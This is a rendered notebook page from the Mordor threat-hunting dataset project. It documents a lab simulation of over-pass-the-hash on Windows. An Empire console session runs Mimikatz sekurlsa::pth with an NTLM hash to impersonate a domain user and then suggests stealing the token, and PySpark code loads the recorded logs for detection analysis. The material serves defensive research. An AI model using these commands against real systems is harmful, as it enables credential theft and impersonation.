---
redirect_from:
  - "/notebooks/small/windows/06-credential-access/sd-190319131123"
interact_link: content/notebooks/small/windows/06_credential_access/SD-190319131123.ipynb
kernel_name: 
kernel_path: content/notebooks/small/windows/06_credential_access
has_widgets: false
title: |-
  Empire Mimikatz OPTH
pagenum: 51
prev_page:
  url: /notebooks/small/windows/06_credential_access/SD-190518235535.html
next_page:
  url: /notebooks/small/windows/06_credential_access/SD-190319145126.html
suffix: .ipynb
search: mimikatz com pth credentials powershell empire mordor ok shire blvusc gentilkiwi domain ntlm dataset hash true false user agent simulation invoke description name module process token blog run set mmidge tasked data null id creation windows hunters forge master fully kerberos execute sekurlsa steal credid benjamin vincent bbaaaffcaafa pid copy aeshmac opth metadata sd author roberto rodriguez cybrwardg date platform environment type c tool script github blacksmith blob aws cfn files scripts ps raw githubusercontent datasets small credentialaccess empiremimikatzopth tar gz represents adversaries taking into fledged tgt adversary view usemodule info needsadmin opsecsafe language minlanguageversion background outputextension none authors josephbialek

comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
---

    <main class="jupyter-page">
    <div id="page-info"><div id="page-title">Empire Mimikatz OPTH</div>
</div>
    <div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<table>
<thead><tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">SD-190319131123</td>
</tr>
<tr>
<td style="text-align:left">author</td>
<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
</tr>
<tr>
<td style="text-align:left">creation date</td>
<td style="text-align:left">2019/03/19</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">Windows</td>
</tr>
<tr>
<td style="text-align:left">Mordor Environment</td>
<td style="text-align:left">shire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Type</td>
<td style="text-align:left">C2</td>
</tr>
<tr>
<td style="text-align:left">Simulation Tool</td>
<td style="text-align:left">Empire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Script</td>
<td style="text-align:left"><a href="https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1">https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1</a></td>
</tr>
<tr>
<td style="text-align:left">Mordor Dataset</td>
<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz</a></td>
</tr>
</tbody>
</table>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries taking a hash into a fully-fledged Kerberos TGT</p>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
<pre><code>(Empire: 8BLV6USC) &gt; usemodule credentials/mimikatz/pth*
(Empire: powershell/credentials/mimikatz/pth) &gt; info

              Name: Invoke-Mimikatz PTH
            Module: powershell/credentials/mimikatz/pth
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to execute
  sekurlsa::pth to create a new process. with a specific
  user's hash. Use credentials/tokens to steal the token
  afterwards.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com
  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-
  hash-with-mimikatz/

Options:

  Name   Required    Value                     Description
  ----   --------    -------                   -----------
  CredID False                                 CredID from the store to use for ticket 
                                              creation.                               
  domain False                                 The fully qualified domain name.        
  ntlm   False                                 The NTLM hash to use.                   
  user   False                                 Username to impersonate.                
  Agent  True        8BLV6USC                  Agent to run module on.                 

4f81f8c89a2a384f4a68credentials/mimikatz/pth) &gt; set ntlm b415baa073a1 
(Empire: powershell/credentials/mimikatz/pth) &gt; set user Mmidge
(Empire: powershell/credentials/mimikatz/pth) &gt; set domain shire.com
(Empire: powershell/credentials/mimikatz/pth) &gt; execute
[*] Tasked 8BLV6USC to run TASK_CMD_JOB
[*] Agent 8BLV6USC tasked with task ID 3
[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/pth
(Empire: powershell/credentials/mimikatz/pth) &gt; Job started: 6DH2RP
Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:Mmidge /domain:shire.com /ntlm:b415baa073a14f81f8c89a2a384f4a68
user    : Mmidge
domain  : shire.com
program : cmd.exe
impers. : no
NTLM    : b415baa073a14f81f8c89a2a384f4a68
  |  PID  7920
  |  TID  8308
  |  LSA Process is now R/W
  |  LUID 0 ; 85924706 (00000000:051f1b62)
  \_ msv1_0   - data copy @ 000001BD859AEBA0 : OK !
  \_ kerberos - data copy @ 000001BD85999068
  \_ aes256_hmac       -&gt; null             
  \_ aes128_hmac       -&gt; null             
  \_ rc4_hmac_nt       OK
  \_ rc4_hmac_old      OK
  \_ rc4_md4           OK
  \_ rc4_hmac_nt_exp   OK
  \_ rc4_hmac_old_exp  OK
  \_ *Password replace @ 000001BD85902A78 (32) -&gt; null


Use credentials/token to steal the token of the created PID.

(Empire: powershell/credentials/mimikatz/pth) &gt;</code></pre>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT channel, COUNT(1)</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">GROUP BY channel</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
        
</pre></div>

    </div>
</div>
</div>

</div>
</div>

 


    </main>
    